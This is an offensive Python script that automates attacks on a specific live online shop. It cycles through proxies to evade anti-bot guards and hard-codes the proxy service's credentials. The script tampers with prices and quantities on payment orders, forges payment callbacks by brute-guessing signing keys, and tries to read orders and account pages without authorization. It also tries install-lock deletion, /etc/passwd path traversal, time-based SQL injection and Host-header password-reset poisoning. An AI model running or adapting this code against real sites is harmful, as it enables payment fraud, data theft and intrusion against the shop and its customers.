#!/usr/bin/env python3
"""hmjf.lol 严重漏洞深挖 v5 — CSRF内支付逻辑/epay/重装链/彩虹免CSRF接口"""
import hashlib, json, os, re, subprocess, time, urllib.parse

BASE = "https://hmjf.lol/shop"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/vuln_crit_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
os.makedirs(OUT, exist_ok=True)
CK = "/tmp/hmjf_v5.ck"

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0
R = {"critical": [], "high": [], "medium": [], "tests": {}}

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1.2)

def go(url, post=None, hdr=None, cookie_file=None, method=None, timeout=18):
    global N, PX
    N += 1
    if N % 60 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX]
    cf = cookie_file or CK
    if os.path.exists(cf):
        c += ["-b", cf, "-c", cf]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(5)
            refresh()
            return go(url, post, hdr, cookie_file, method, timeout)
        m = re.search(r"__C:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        return body, int(m.group(1)) if m else 0
    except Exception as e:
        return str(e), 0

def add(level, title, detail):
    R[level].append({"title": title, **detail})
    print(f"[{level.upper()}] {title}", flush=True)

def save():
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def buy_ctx(tid=72):
    if os.path.exists(CK):
        os.remove(CK)
    page, _ = go(f"{BASE}/?mod=buy&tid={tid}")
    csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
    hs = re.search(r'hashsalt\s*=\s*"([^"]+)"', page)
    price = re.search(r'name="money"[^>]*value="([^"]+)"', page) or re.search(r'price["\']?\s*[:=]\s*["\']?([0-9.]+)', page)
    return {
        "csrf": csrf.group(1) if csrf else "",
        "hashsalt": hs.group(1) if hs else "",
        "price": price.group(1) if price else "",
        "page_len": len(page),
    }

print("[1] 支付逻辑 + CSRF", flush=True)
for tid in [72, 194, 558]:
    ctx = buy_ctx(tid)
    R["tests"][f"buy_ctx_{tid}"] = ctx
    if not ctx["csrf"]:
        continue
    base_post = f"tid={tid}&num=1&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=alipay"
    tests = [
        ("price0", base_post + "&money=0"),
        ("price001", base_post + "&money=0.01"),
        ("num0", f"tid={tid}&num=0&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("num-1", f"tid={tid}&num=-1&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("num99999", f"tid={tid}&num=99999&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("no_hashsalt", f"tid={tid}&num=1&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("empty_hashsalt", f"tid={tid}&num=1&hashsalt=&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("tid_swap", f"tid=1&num=1&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=alipay"),
        ("payrmb", f"tid={tid}&num=1&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=rmb"),
        ("wxpay", f"tid={tid}&num=1&hashsalt={ctx['hashsalt']}&csrf_token={ctx['csrf']}&pay_type=wxpay"),
    ]
    for label, post in tests:
        body, code = go(f"{BASE}/ajax.php?act=pay", post=post)
        R["tests"][f"pay_{tid}_{label}"] = {"code": code, "body": body[:250]}
        if '"code":0' in body or '"trade_no"' in body:
            tn = re.search(r"20\d{15}", body)
            if tn:
                sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn.group(0)}")
                mo = re.search(r"money=([0-9.]+)", sh)
                money = mo.group(1) if mo else "?"
                if label.startswith("price") and money in ("0", "0.01", "0.00"):
                    add("critical", f"价格篡改成功 tid={tid} {label}", {"trade_no": tn.group(0), "money": money, "pay_resp": body[:200]})
                elif "num" in label and '"code":0' in body:
                    add("high", f"异常数量下单 tid={tid} {label}", {"trade_no": tn.group(0), "money": money})
                elif label == "payrmb" and '"code":0' in body:
                    add("critical", f"余额支付未校验 tid={tid}", {"trade_no": tn.group(0), "resp": body[:200]})
        time.sleep(0.15)
save()

print("[2] epay notify 深测", flush=True)
tn = "20260716031453854"
sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
params = dict(re.findall(r'name="([^"]+)"\s+value="([^"]+)"', sh))
target_sign = params.get("sign", "")
keys = ["", "123456", "1003", "hmjf", "xuxin", "ttwl66", "datou111", "datou333",
        "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x", "api.ttwl66.cn", "888888", "xuxin66vip",
        "hmjf.lol", "虚心U", "02E76F93", "A0FFB679553D", "shua", "faka", "caihong"]
for key in keys:
    p = dict(params, trade_status="TRADE_SUCCESS")
    items = sorted((k, v) for k, v in p.items() if v and k not in ("sign", "sign_type"))
    s = "&".join(f"{k}={v}" for k, v in items) + key
    sig = hashlib.md5(s.encode()).hexdigest()
    p["sign"] = sig
    p["sign_type"] = "MD5"
    qs = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in sorted(p.items()))
    for method, url in [("GET", f"{BASE}/other/epay_notify.php?{qs}"), ("POST", f"{BASE}/other/epay_notify.php", qs)]:
        if method == "GET":
            body, _ = go(url)
        else:
            body, _ = go(url, post=qs)
        gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
        if body.strip().lower() in ("success", "ok") or (body.strip() == "success" and "未付款" not in gs):
            add("critical", f"epay_notify伪造成功 key={key!r}", {"method": method, "notify": body, "getshop": gs[:200]})
        if key == "" and method == "GET":
            R["tests"]["epay_sample"] = {"notify": body[:80], "getshop": gs[:100]}
    time.sleep(0.1)
save()

print("[3] 彩虹免CSRF接口滥用", flush=True)
# order/query/cart 通常免CSRF
for oid in [1, 2, 100, 1000, 5000, 13330]:
    body, _ = go(f"{BASE}/ajax.php?act=order", post=f"id={oid}&skey={'0'*32}")
    if body and "验证失败" not in body and '"code":0' in body:
        add("critical", f"ajax order 弱skey可读 id={oid}", {"resp": body[:300]})
for act, post in [
    ("query", "type=1&qq=20260716031453854"),
    ("query", "qq=13800138000"),
    ("query", "qq=1"),
    ("cart_add", "tid=72&num=1"),
    ("cancel", "orderid=20260716031453854"),
    ("buy", "tid=72&num=1&inputvalue=test"),
]:
    body, _ = go(f"{BASE}/ajax.php?act={act}", post=post)
    R["tests"][f"nocsrf_{act}"] = body[:200]
    if '"code":0' in body and act in ("cancel", "cart_add"):
        add("high", f"免CSRF {act} 成功", {"post": post, "resp": body[:200]})
    if act == "query" and '"data"' in body and len(body) > 80:
        add("high", "query泄露订单", {"post": post, "body": body[:400]})
save()

print("[4] install / 写权限探测", flush=True)
for method in ["GET", "DELETE", "PUT"]:
    body, code = go(f"{BASE}/install/install.lock", method=method)
    R["tests"][f"install_lock_{method}"] = {"code": code, "body": body[:100]}
    if code in (200, 204) and method == "DELETE" and "安装锁" not in body:
        add("critical", "install.lock可DELETE", {"resp": body[:100]})
# install ajax?
for p in ["/install/ajax.php?act=test", "/install/api.php", "/install/db.php"]:
    body, code = go(f"{BASE}{p}")
    if code == 200 and len(body) > 20:
        add("high", f"install子路径可达 {p}", {"snippet": body[:200]})
save()

print("[5] 用户认证绕过", flush=True)
# 直接访问需登录页
for p in ["user/record.php", "user/recharge.php", "user/index.php", "user/?mod=order"]:
    body, code = go(f"{BASE}/{p}")
    leak = any(x in body for x in ["余额", "卡密", "kminfo", "订单列表", "充值成功"])
    R["tests"][p] = {"code": code, "len": len(body), "leak": leak}
    if leak:
        add("critical", f"未登录访问泄露 {p}", {"snippet": body[:300]})
# ajax checklogin / info
body, _ = go(f"{BASE}/ajax.php?act=checklogin", post="")
if '"code":0' in body and "登录" not in body:
    R["tests"]["checklogin"] = body[:150]
body, _ = go(f"{BASE}/ajax.php?act=info", post="")
if '"code":0' in body and len(body) > 50:
    add("high", "ajax info未授权", {"resp": body[:200]})
save()

print("[6] 文件/路径", flush=True)
traversals = [
    "/other/download.php?file=../../../etc/passwd",
    "/other/download.php?my=../../../etc/passwd",
    "/other/download.php?filename=../../../etc/passwd",
    "/assets/../../../etc/passwd",
    "/?mod=../../etc/passwd",
    "/user/download.php?file=1",
]
for p in traversals:
    body, code = go(f"{BASE}{p}" if not p.startswith("http") else p)
    if "root:" in body:
        add("critical", f"LFI/路径穿越 {p}", {"snippet": body[:200]})
    R["tests"][p] = {"code": code, "len": len(body)}
save()

print("[7] SQLi 时间盲注", flush=True)
payloads = [
    ("login", f"{BASE}/user/login.php", "user=admin' AND SLEEP(5)-- -&pass=x&code=0000"),
    ("query", f"{BASE}/?mod=query&data=1' AND SLEEP(5)-- "),
    ("buy", f"{BASE}/?mod=buy&tid=1 AND SLEEP(5)-- "),
]
for name, url, post in payloads:
    t0 = time.time()
    if "login" in name:
        body, _ = go(url, post=post)
    else:
        body, _ = go(url if "?" in url else url, post=None)
        if "query" in name or "buy" in name:
            body, _ = go(url)
    elapsed = time.time() - t0
    R["tests"][f"sqli_time_{name}"] = {"elapsed": round(elapsed, 2), "len": len(body)}
    if elapsed > 4.5:
        add("critical", f"SQLi时间盲注 {name}", {"elapsed": elapsed, "url": url})
save()

print("[8] Host/缓存投毒", flush=True)
body, code = go(f"{BASE}/user/findpwd.php",
               hdr={"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
               post="user=admin&email=test@test.com")
if "evil.com" in body:
    add("high", "密码重置Host投毒", {"snippet": body[:200]})
save()

R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium"]}
save()
print(f"DONE {R['summary']}", flush=True)
